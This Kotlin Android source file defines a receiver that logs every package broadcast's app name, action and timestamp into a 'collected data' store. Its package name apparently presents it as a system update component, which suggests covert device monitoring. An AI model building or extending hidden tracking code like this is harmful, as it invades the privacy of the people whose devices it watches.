package com.androidsystem.update.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.androidsystem.update.database.DataRepository
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import org.json.JSONObject
import javax.inject.Inject

@AndroidEntryPoint
class PackageReceiver : BroadcastReceiver() {
    @Inject lateinit var repository: DataRepository

    override fun onReceive(context: Context, intent: Intent) {
        val packageName = intent.data?.schemeSpecificPart ?: return
        val action = intent.action ?: return
        val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        scope.launch {
            try {
                repository.insertCollectedData("package_event", JSONObject().apply {
                    put("package", packageName)
                    put("action", action)
                    put("timestamp", System.currentTimeMillis())
                }.toString())
            } finally {
                scope.cancel()
            }
        }
    }
}
